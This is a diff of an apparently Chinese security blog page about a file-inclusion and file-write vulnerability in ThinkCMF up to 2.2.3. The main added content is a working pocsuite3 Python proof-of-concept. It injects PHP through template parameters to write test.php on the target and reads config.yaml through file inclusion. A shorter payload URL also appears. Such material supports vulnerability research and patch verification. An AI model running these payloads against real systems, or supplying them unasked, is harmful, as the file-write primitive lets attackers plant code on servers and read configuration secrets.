@@ -431,14 +431,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        322
+                        839
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        4 分
                     </div>
                     
                 
@@ -482,7 +482,80 @@
 <p>payload:</p>
 <p><code>?a=display&amp;templateFile=README.md</code></p>
 <p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024122420.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/217586.html" target="_blank" rel="noopener">ThinkCMF框架上的任意内容包含漏洞 - FreeBuf互联网安全新媒体平台</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483900&idx=1&sn=028d4d1c0f804af29594380de17ebf93" target="_blank" rel="noopener">ThinkCMF框架任意内容包含漏洞分析复现</a></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3
+&quot;&quot;&quot;
+
+@FileName: thinkcmf_2_2_3_file_inclusion.py
+@Author: dylan
+@software: PyCharm 
+@Datetime: 2019-10-24 13:55
+
+&quot;&quot;&quot;
+
+import urllib.parse
+from pocsuite3.api import Output, POCBase, register_poc, requests, logger
+
+
+class DemoPOC(POCBase):
+    vulID = &quot;0&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = &quot;3.0&quot;  # 默认为1
+    author = &quot;dylan&quot;  # PoC作者的大名
+    vulDate = &quot;2019/10/24&quot;  # 漏洞公开的时间,不知道就写今天
+    createDate = &quot;2019/10/24&quot;  # 编写 PoC 的日期
+    updateDate = &quot;2019/10/24&quot;  # PoC 更新的时间,默认和编写时间一样
+    references = [
+        &quot;https://dylan903.coding.me/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/&quot;]  # 漏洞地址来源,0day不用写
+    name = &quot;thinkcmf_2_2_3_file_inclusion&quot;  # PoC 名称
+    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址
+    appName = &quot;ThinkCMF&quot;  # 漏洞应用名称
+    appVersion = &#39;ThinkCMF X1.6.0、X2.1.0、X2.2.0、X2.2.1、X2.2.2、X2.2.3&#39;  # 漏洞影响版本
+    vulType = &quot;File Inclusion&quot;  # 漏洞类型,类型参考见 漏洞类型规范表
+    desc = &quot;&quot;&quot;
+
+    &quot;&quot;&quot;  # 漏洞简要描述
+    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    pocDesc = &quot;&quot;&quot;
+
+    &quot;&quot;&quot;
+
+    def _verify(self):
+        # 验证代码
+        result = {}
+        payload1 = &#39;?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=&lt;php&gt;file_put_contents(%27test.php%27,&#39; \
+                   &#39;%27hello world!%27)&lt;/php&gt; &#39;
+        payload2 = &#39;?a=display&amp;templateFile=config.yaml&#39;
+        path1 = self.url + payload1
+        path2 = self.url + payload2
+
+        respose1 = requests.get(path1, verify=False, timeout=30)
+        respose2 = requests.get(self.url + &quot;/test.php&quot;, verify=False, timeout=30)
+        respose3 = requests.get(path2, verify=False, timeout=30)
+
+        if &#39;hello world!&#39; in respose2.text:  # result是返回结果
+            result[&#39;VerifyInfo&#39;] = {}
+            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
+            result[&#39;VerifyInfo&#39;][&#39;VUL1&#39;] = &quot;目标存在文件写入漏洞&quot;
+        if &#39;name: thinkcmf&#39; in respose3.text:
+            result[&#39;VerifyInfo&#39;][&#39;VUL2&#39;] = &quot;目标存在文件包含漏洞&quot;
+
+        return self.parse_output(result)
+
+    def _attack(self):
+        # 攻击代码
+        return self._verify()
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail(&quot;Internet nothing returned&quot;)
+        return output
+
+
+# 注册 DemoPOC 类
+register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/217586.html" target="_blank" rel="noopener">ThinkCMF框架上的任意内容包含漏洞 - FreeBuf互联网安全新媒体平台</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483900&idx=1&sn=028d4d1c0f804af29594380de17ebf93" target="_blank" rel="noopener">ThinkCMF框架任意内容包含漏洞分析复现</a></p>
 
             </div>
             <hr/>
@@ -1217,7 +1290,7 @@ Ng
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">25.1k</span>
+                <span class="white-color">25.6k</span>
             
 
             
